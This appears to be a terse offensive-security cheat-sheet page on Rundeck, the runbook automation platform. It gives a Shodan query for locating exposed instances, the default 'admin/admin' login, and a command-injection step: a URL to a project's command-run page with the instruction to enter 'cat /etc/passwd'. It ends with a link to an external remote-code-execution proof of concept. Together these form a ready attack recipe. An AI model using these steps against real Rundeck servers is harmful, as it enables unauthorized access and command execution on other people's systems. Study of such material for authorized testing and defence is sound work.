---
description: Rundeck by PagerDuty is the leading OSS runbook automation platform
---

# Rundeck



## Search

```
https://www.shodan.io/search?query=title%3A%22Rundeck%22
```

## Default Login

```
admin/admin
```

## Authentication Command Injection



```
http://{domain}/project/Identity-Runbook-Automation/command/run?filter=.&filterName=..
enter: cat /etc/passwd
```

{% embed url="https://github.com/karkis3c/bugbounty/blob/main/poc/rundeck-rce.md" %}
